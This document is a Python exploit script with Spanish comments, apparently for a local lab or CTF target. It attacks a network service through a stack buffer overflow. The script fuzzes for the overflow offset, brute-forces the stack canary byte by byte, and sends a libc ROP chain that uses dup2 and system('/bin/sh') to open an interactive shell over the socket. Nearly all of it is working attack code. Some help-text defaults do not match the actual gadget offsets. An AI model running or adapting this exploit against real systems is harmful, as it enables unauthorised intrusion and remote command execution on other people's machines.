import struct
import time
import socket
import sys
import argparse
from pwn import *

# ================== PARÁMETROS VARIABLES ==================

DEFAULT_PORT = 9999
DEFAULT_HOST = "localhost"
DEFAULT_LIBC_BASE_START = 0xf7d00000
DEFAULT_LIBC_BASE_END = 0xf7e00000
DEFAULT_PAGE_SIZE = 0x1000
DEFAULT_GADGET1_OFFSET = 0x0010194a
DEFAULT_GADGET2_OFFSET = 0x00053187
DEFAULT_LIBC_PATH = "/usr/lib/libc.so.6"
DEFAULT_STATIC_LIBC_BASE= 0x00007ffff7da9000

parser = argparse.ArgumentParser(description="Exploit automatizado para buffer overflow con canary y libc.")
parser.add_argument("--host", default="localhost", help="Host objetivo (default: localhost)")
parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Puerto objetivo (default: 9999)")
parser.add_argument("--libc", default=DEFAULT_LIBC_PATH, help="Ruta a la libc (default: /usr/lib/libc.so.6)")
parser.add_argument("--libc-base-start", type=lambda x: int(x,0), default=DEFAULT_LIBC_BASE_START, help="Inicio del rango base de libc (default: 0xf7d00000)")
parser.add_argument("--libc-base-end", type=lambda x: int(x,0), default=DEFAULT_LIBC_BASE_END, help="Fin del rango base de libc (default: 0xf7e00000)")
parser.add_argument("--page-size", type=lambda x: int(x,0), default=DEFAULT_PAGE_SIZE, help="Tamaño de página (default: 0x1000)")
parser.add_argument("--gadget1-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET1_OFFSET, help="Offset del primer gadget (default: 0x000238a3)")
parser.add_argument("--gadget2-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET2_OFFSET, help="Offset del segundo gadget (default: 0x0019ef7b)")
parser.add_argument("--known-canary", type=lambda x: int(x,0), default=None, help="Valor conocido del canario (opcional)")
args = parser.parse_args()

HOST = args.host
PORT = args.port
LIBC_PATH = args.libc
LIBC_BASE_START = args.libc_base_start
LIBC_BASE_END = args.libc_base_end
PAGE_SIZE = args.page_size
GADGET1_OFFSET = args.gadget1_offset
GADGET2_OFFSET = args.gadget2_offset
known_canary = args.known_canary

# ================== FUNCIONES ==================
def generar_direcciones_libc(base_start=LIBC_BASE_START, base_end=LIBC_BASE_END, page_size=PAGE_SIZE):
    return [addr for addr in range(base_start, base_end, page_size)]

def get_connection():
    s = socket.socket()
    s.connect((HOST, PORT))
    return s

def interact_shell(s):
    sys.stdout.flush()
    sleep(1)
    s.settimeout(0.5)
    try:
        s.send("whoami\n".encode())
        sys.stdout.write(s.recv(4096).decode(errors='ignore'))
        while True:
            try:
                sys.stdout.flush()
                c = input("$-> ")
                s.send((c + '\n').encode())
                time.sleep(0.2)
                sys.stdout.write(s.recv(4096).decode(errors='ignore'))
            except socket.timeout:
                continue
            except (ConnectionResetError, BrokenPipeError):
                print("Conexión cerrada por el servidor.")
                break
            except KeyboardInterrupt:
                print("quit")
                s.close()
                break
    except (ConnectionResetError, BrokenPipeError):
        print("Conexión cerrada por el servidor.")

def send_payload(payload_data: bytes, timeout: float = 2.0):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if timeout > 0:
        sock.settimeout(timeout)
    try:
        sock.connect((HOST, PORT))
        sock.send(payload_data)
        response = sock.recv(2048)
        if response:
            return True
    except socket.timeout:
        print("Socket timeout occurred.")
    except socket.error as sock_error:
        print(f"Socket error: {sock_error}")
    finally:
        sock.close()
    return False

def calcular_offset():
    i = 20
    while True:
        PAYLOAD = b"A" * i
        RESPONSE = send_payload(PAYLOAD)
        if not RESPONSE:
            print(f"[+] GOT IT: offset = {i-1}")
            return i-1
        i += 1

def byte_for_byte(payload, len_payload=8):
    p = payload
    start = len(p)
    stop = len(p) + len_payload
    while len(p) < stop:
        for i in range(0, 256):
            attempt = p + bytes([i])
            res = send_payload(attempt)
            if res:
                p = attempt
                print("[+] Byte found 0x%02x" % i)
                break
            if i == 255:
                print("[-] Exploit failed")
                sys.exit(-1)
    result = p[-len_payload:]
    return result

# ================== EXPLOIT ==================
offset = calcular_offset()

print("[+] Byte for byte canary ...")
canary = struct.pack(">Q", known_canary) if known_canary else byte_for_byte(b"A" * offset, 8)
print(f"[+] Canary value is 0x{canary.hex()}")


libc = ELF(LIBC_PATH, checksec=False)
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
ls_command_offset = next(libc.search(b"/etc/shells")) + 0x9 # 0x9 is the offset to the command
binsh_offset = next(libc.search(b"/bin/sh"))
dup2_offset = libc.symbols["dup2"]

libc_base_guesses = [DEFAULT_STATIC_LIBC_BASE]  # Using DEFAULT_STATIC_LIBC_BASE 100 times

print(f"Guesses: {len(libc_base_guesses)}")

for base in libc_base_guesses:
    system = struct.pack("<Q", (base + system_offset))
    exit_addr = struct.pack("<Q", (base + exit_offset))
    ls_cmd = struct.pack("<Q", (base + ls_command_offset))
    dup2_cmd = struct.pack("<Q", (base + dup2_offset))
    binsh = struct.pack("<Q", (base + binsh_offset))
    gadget1 = struct.pack("<Q", (base + GADGET1_OFFSET))
    gadget2 = struct.pack("<Q", (base + GADGET2_OFFSET))

    PAYLOAD = b"A" * offset
    PAYLOAD += canary
    PAYLOAD += b"B" * 8

    # Duplicar el socket (4) a stdin, stdout, stderr
    for fd in [0, 1, 2]:
        PAYLOAD += gadget1            # pop rdi; ret
        PAYLOAD += struct.pack("<Q", 4)  # socket fd
        PAYLOAD += gadget2            # pop rsi; ret (debes asegurarte que gadget2 sea pop rsi; ret)
        PAYLOAD += struct.pack("<Q", fd)
        # PAYLOAD += b"C" * 8           # padding para rdx si gadget2 es pop rsi; pop r15; ret
        PAYLOAD += dup2_cmd           # dup2

    # Ahora el shell será interactivo por el socket
    PAYLOAD += gadget1
    PAYLOAD += ls_cmd
    PAYLOAD += system
    PAYLOAD += gadget1
    PAYLOAD += binsh
    PAYLOAD += system

    try:
        s = get_connection()
        s.settimeout(0.5)
        s.send(PAYLOAD)
        response = s.recv(4096)
        if response:
            s.settimeout(None)
            print("[+] Shell encontrada:")
            interact_shell(s)
            break
        else:
            s.close()
    except socket.timeout:
        print("Socket timeout occurred.")

print("[+] Finished wihout success")